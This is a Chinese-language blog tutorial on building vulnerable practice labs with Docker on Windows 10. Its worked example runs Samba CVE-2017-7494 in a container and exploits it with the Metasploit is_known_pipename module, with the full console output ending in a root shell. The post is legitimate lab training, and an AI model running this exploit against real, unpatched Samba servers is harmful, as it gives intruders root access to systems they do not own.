<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>用Docker来搭建各种漏洞靶场(妈妈再也不用担心我没有靶场练习了) - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>用Docker来搭建各种漏洞靶场(妈妈再也不用担心我没有靶场练习了)</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
<div class="container text-center mt-3">
    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
</div>
</div>
<div class="meta">
  <div>2018-03-14 16:49</div>
  <div>
    <span><a href="https://getshe11.com/tags/0day/">#0day</a></span>
      <span><a href="https://getshe11.com/tags/cve/">#CVE</a></span>
      <span><a href="https://getshe11.com/tags/docker/">#Docker</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="1-前言">1. 前言</h1>
<p>最近练习也在搭建这个漏洞环境，但是很费时间，然后就想到用Docker搭建比较快，又方便。不多废话，直接开始吧！</p>
<h1 id="2-下载docker">2. 下载Docker</h1>
<p>我本次是利用Windows 10 来安装Docker，因为Windows出现了一个问题需要解决下，Linux和Mac安装官网的安装方法基本没什么问题。</p>
<p>官方下载地址：https://docs.docker.com/docker-for-windows/install/
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/dcoker2.png" alt=""></p>
<h2 id="安装升级你的docker客户端">安装／升级你的Docker客户端</h2>
<p>对于Windows 10以下的用户 推荐使用 Docker Toolbox
Toolbox的介绍和帮助：mirrors.aliyun.com/help/docker-toolbox</p>
<p>Windows系统的安装文件目录：http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/</p>
<p>对于Windows 10以上的用户 推荐使用 Docker for Windows
Windows系统的安装文件目录：http://mirrors.aliyun.com/docker-toolbox/windows/docker-for-windows/</p>
<!-- raw HTML omitted -->
<h1 id="3-安装docker">3. 安装Docker</h1>
<ul>
<li>
<p>运行安装文件：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/docker1.png" alt=""></p>
</li>
<li>
<p>安装完成：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/docker2.png" alt=""></p>
</li>
<li>
<p>安装完之后会出现一个问题，就是要你开win10里面的<code>Hyper-V</code>，这个功能和<code>VMware</code>是冲突的，所以你开了<code>Hyper-V</code>就不能用<code>VMware</code>了</p>
</li>
</ul>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/docker4.png" alt=""></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/docker3.png" alt=""></p>
<ul>
<li>开启<code>Hyper-V</code>然后重启就可以使用了。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/docker.png" alt=""></li>
</ul>
<h1 id="4-使用国内的docker加速器">4. 使用国内的Docker加速器</h1>
<p>注册一个阿里云的账号：https://cr.console.aliyun.com/#/accelerator</p>
<p>然后获取专属加速器地址：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/docker5.png" alt=""></p>
<p>在系统右下角托盘图标内右键菜单选择 Settings，打开配置窗口后左侧导航菜单选择 Docker Daemon。编辑窗口内的JSON串，填写加速器地址，如下所示：</p>
<pre><code>{
  &quot;registry-mirrors&quot;: [&quot;https://0sdzi917.mirror.aliyuncs.com&quot;]
}
</code></pre><h1 id="5-用docker生成漏洞环境并使用">5. 用Docker生成漏洞环境并使用</h1>
<ul>
<li>这里我用<code>Samba远程代码执行漏洞(CVE-2017-7494)</code>来做测试。</li>
</ul>
<blockquote>
<p>2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。</p>
</blockquote>
<h2 id="获取环境">获取环境</h2>
<ol>
<li>
<p>拉取镜像到本地
<code>docker pull medicean/vulapps:s_samba_1</code></p>
</li>
<li>
<p>启动环境
<code>docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/docker6.png" alt=""></p>
</li>
</ol>
<p><!-- raw HTML omitted -->-p 445:445 前面的 445 代表物理机的端口<!-- raw HTML omitted --></p>
<h2 id="利用步骤">利用步骤</h2>
<p>我这里用虚拟机中<code>Ubuntu</code>来做实验，因为虚拟机的WIN10冲突了，命令都差不多的。</p>
<p>我的靶机IP是：<code>10.150.37.143</code>，也就是Docker的那台机子</p>
<pre><code>msf &gt; use exploit/linux/samba/is_known_pipename
msf exploit(linux/samba/is_known_pipename) &gt; set RHOST 10.150.37.143
RHOST =&gt; 10.150.37.143
msf exploit(linux/samba/is_known_pipename) &gt; show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOST           10.150.37.143    yes       The target address
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf exploit(linux/samba/is_known_pipename) &gt; exploit 

[*] 10.150.37.143:445 - Using location \\10.150.37.143\share\ for the path
[*] 10.150.37.143:445 - Retrieving the remote path of the share 'share'
[*] 10.150.37.143:445 - Share 'share' has server-side path '/tmp/
[*] 10.150.37.143:445 - Uploaded payload to \\10.150.37.143\share\WxwPDkIX.so
[*] 10.150.37.143:445 - Loading the payload from server-side path /tmp/WxwPDkIX.so using \\PIPE\/tmp/WxwPDkIX.so...
[-] 10.150.37.143:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 10.150.37.143:445 - Loading the payload from server-side path /tmp/WxwPDkIX.so using /tmp/WxwPDkIX.so...
[+] 10.150.37.143:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 3 opened (10.150.37.128:41939 -&gt; 10.150.37.143:445) at 2018-03-14 05:30:35 -0400

id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/docker7.png" alt=""></p>
<h1 id="6-结束">6. 结束</h1>
<p>这玩其实还挺方便的，如果有时间的话可以去尝试自己动手配置环境，因为那样会遇到很多问题，自己又能学到更多的解决问题的方法了。</p>
<h1 id="7-参考">7. 参考</h1>
<p><a href="http://vulapps.evalbug.com/">http://vulapps.evalbug.com/</a> 漏洞环境下载库</p>
<p><a href="https://docs.docker.com/">https://docs.docker.com/</a></p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1-%e5%89%8d%e8%a8%80">
                            1. 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2-%e4%b8%8b%e8%bd%bddocker">
                            2. 下载Docker
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%ae%89%e8%a3%85%e5%8d%87%e7%ba%a7%e4%bd%a0%e7%9a%84docker%e5%ae%a2%e6%88%b7%e7%ab%af">
                            安装／升级你的Docker客户端
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#3-%e5%ae%89%e8%a3%85docker">
                            3. 安装Docker
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#4-%e4%bd%bf%e7%94%a8%e5%9b%bd%e5%86%85%e7%9a%84docker%e5%8a%a0%e9%80%9f%e5%99%a8">
                            4. 使用国内的Docker加速器
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#5-%e7%94%a8docker%e7%94%9f%e6%88%90%e6%bc%8f%e6%b4%9e%e7%8e%af%e5%a2%83%e5%b9%b6%e4%bd%bf%e7%94%a8">
                            5. 用Docker生成漏洞环境并使用
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e8%8e%b7%e5%8f%96%e7%8e%af%e5%a2%83">
                            获取环境
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%88%a9%e7%94%a8%e6%ad%a5%e9%aa%a4">
                            利用步骤
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#6-%e7%bb%93%e6%9d%9f">
                            6. 结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#7-%e5%8f%82%e8%80%83">
                            7. 参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
